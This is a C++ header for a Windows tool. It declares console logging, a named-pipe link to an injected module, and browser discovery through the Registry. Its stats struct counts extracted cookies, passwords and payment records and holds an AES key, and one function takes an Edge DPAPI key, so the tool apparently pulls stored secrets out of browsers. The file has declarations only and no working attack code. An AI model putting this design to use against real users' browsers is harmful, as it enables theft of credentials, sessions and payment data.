// CommunicationLayer.h - Console output and inter-process communication
#ifndef COMMUNICATION_LAYER_H
#define COMMUNICATION_LAYER_H

#include <Windows.h>
#include <filesystem>
#include <string>
#include <vector>
#include <sstream>
#include "BannerSystem.h"
#include "BrowserHelp.h"

namespace fs = std::filesystem;

// Utility functions for string and path operations
namespace Utils
{
    std::string u8string_to_string(const std::u8string& u8str) noexcept;
    std::string path_to_api_string(const fs::path& path);
    fs::path GetLocalAppDataPath();
    std::string WStringToUtf8(std::wstring_view w_sv);
    std::string PtrToHexStr(const void* ptr) noexcept;
    std::string NtStatusToString(NTSTATUS status) noexcept;
    std::wstring GenerateUniquePipeName();
    std::string Capitalize(const std::string& str);
}

// Manages console output with colored messages
class Console
{
public:
    explicit Console(bool verbose);

    void Info(const std::string& msg) const;
    void Success(const std::string& msg) const;
    void Error(const std::string& msg) const;
    void Warn(const std::string& msg) const;
    void Debug(const std::string& msg) const;
    void Relay(const std::string& message) const;

    bool m_verbose;

private:
    void print(const std::string& tag, const std::string& msg, WORD color) const;
    void SetColor(WORD attributes) const noexcept;
    void ResetColor() const noexcept;

    HANDLE m_hConsole;
    WORD m_originalAttributes;
};

// Handles named pipe communication with injected module
class PipeCommunicator
{
public:
    struct ExtractionStats
    {
        int totalCookies = 0;
        int totalPasswords = 0;
        int totalPayments = 0;
        int profileCount = 0;
        std::string aesKey;
    };

    PipeCommunicator(const std::wstring& pipeName, const Console& console);

    void create();
    void waitForClient();
    void sendInitialData(bool isVerbose, const fs::path& outputPath, const std::vector<uint8_t>& edgeDpapiKey = {});
    void relayMessages();

    const ExtractionStats& getStats() const noexcept { return m_stats; }
    const std::wstring& getName() const noexcept { return m_pipeName; }

private:
    // RAII wrapper for pipe handle
    struct PipeDeleter
    {
        void operator()(HANDLE h) const noexcept
        {
            if (h != INVALID_HANDLE_VALUE)
                CloseHandle(h);
        }
    };
    using UniquePipe = std::unique_ptr<void, PipeDeleter>;

    void writeMessage(const std::string& msg);
    void parseExtractionMessage(const std::string& message);

    std::wstring m_pipeName;
    const Console& m_console;
    UniquePipe m_pipeHandle;
    ExtractionStats m_stats;
};

// Resolves browser installation paths via Registry
class BrowserPathResolver
{
public:
    explicit BrowserPathResolver(const Console& console);

    std::wstring resolve(const std::wstring& browserExeName);
    std::vector<std::pair<std::wstring, std::wstring>> findAllInstalledBrowsers();

private:
    std::wstring queryRegistryDefaultValue(const std::wstring& keyPath);

    const Console& m_console;
};

#endif // COMMUNICATION_LAYER_H